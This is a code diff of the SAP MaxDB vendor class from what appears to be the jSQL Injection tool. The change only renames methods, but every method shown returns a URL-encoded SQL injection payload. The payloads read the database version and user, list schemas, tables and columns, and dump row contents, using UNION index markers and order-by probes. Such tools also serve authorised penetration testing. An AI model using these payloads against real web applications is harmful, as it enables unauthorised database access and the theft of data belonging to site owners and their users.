@@ -15,13 +15,13 @@ import com.jsql.util.StringUtil;
 public class MaxDbVendor extends AbstractVendorDefault {
 
     @Override
-    public String getSqlInfos() {
+    public String sqlInfos() {
         return
             "SELECT+'-'||id||'"+ SEPARATOR_SQL +"'||DATABASE()||'"+ SEPARATOR_SQL +"'||user()||'"+ TRAIL_SQL +"'r+from+sysinfo.VERSION";
     }
 
     @Override
-    public String getSqlDatabases() {
+    public String sqlDatabases() {
         return
             "select+rr||'"+ TRAIL_SQL +"'r+from(select+'"+ SEPARATOR_SQL +"'||trim(t.schemaname)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+schemaname+from+SCHEMAS)t,(select+distinct+schemaname+from+SCHEMAS)t1+" +
@@ -30,7 +30,7 @@ public class MaxDbVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlTables(Database database) {
+    public String sqlTables(Database database) {
         return
             "select+rr||'"+ TRAIL_SQL +"'r+from(select+'"+ SEPARATOR_SQL +"'||trim(t.tablename)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+tablename+from+TABLES+where+SCHEMANAME='" + database + "')t,(select+distinct+tablename+from+TABLES+where+SCHEMANAME='" + database + "')t1+" +
@@ -39,7 +39,7 @@ public class MaxDbVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlColumns(Table table) {
+    public String sqlColumns(Table table) {
         return
             "select+rr||'"+ TRAIL_SQL +"'r+from(select+'"+ SEPARATOR_SQL +"'||trim(t.COLUMNNAME)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+COLUMNNAME+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')t,(select+distinct+COLUMNNAME+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')t1+" +
@@ -48,7 +48,7 @@ public class MaxDbVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlRows(String[] columns, Database database, Table table) {
+    public String sqlRows(String[] columns, Database database, Table table) {
         String formatListColumn = StringUtil.join(columns, "{%}");
         
         // character 7f, last available hexa character (starting at character 80, it gives ?)
@@ -63,13 +63,13 @@ public class MaxDbVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlNormal(String sqlQuery, String startPosition) {
+    public String sqlNormal(String sqlQuery, String startPosition) {
         return
             "select+'SQLi'||SUBSTR(r," + startPosition + ",1500)from(" + sqlQuery + ")x";
     }
 
     @Override
-    public String getSqlCapacity(String[] indexes) {
+    public String sqlCapacity(String[] indexes) {
         return
             MediatorModel.model().getIndexesInUrl().replaceAll(
                 "1337(" + StringUtil.join(indexes, "|") + ")7331",
@@ -78,7 +78,7 @@ public class MaxDbVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlIndices(Integer nbFields) {
+    public String sqlIndices(Integer nbFields) {
         String replaceTag = "";
         List<String> fields = new ArrayList<>(); 
         for (int i = 1 ; i <= nbFields ; i++) {
@@ -89,12 +89,12 @@ public class MaxDbVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlOrderBy() {
+    public String sqlOrderBy() {
         return "+order+by+1337--+";
     }
 
     @Override
-    public String getSqlLimit(Integer limitSQLResult) {
+    public String sqlLimit(Integer limitSQLResult) {
         return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
     }
 }
